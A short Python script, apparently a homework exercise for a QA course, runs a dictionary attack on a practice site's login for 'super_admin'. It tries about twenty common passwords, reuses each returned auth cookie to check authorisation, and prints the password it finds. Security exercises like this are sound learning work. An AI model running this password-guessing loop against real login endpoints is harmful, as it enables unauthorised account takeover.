import requests

passwords = ["123456", "admin", "12345678", "123456789","12345","password","Aa123456","1234567890",
             "Pass@123","admin123","1234567","123123","111111","12345678910","P@ssw0rd","Password","Aa@123456",
             "admintelecom","Admin@123","112233"]

for password in passwords:
        response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login":"super_admin", "password": password})
        cookie_value = response1.cookies.get('auth_cookie')
        cookies = {'auth_cookie': cookie_value}

        response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",cookies=cookies)

        if response2.text != 'You are NOT authorized':
            print(f"Ваш пароль найден: '{password}'")
            print(f"Правильная авторизация: {response2.text}")
            break
else:
    print("Пароль не найден в списке популярных паролей.")


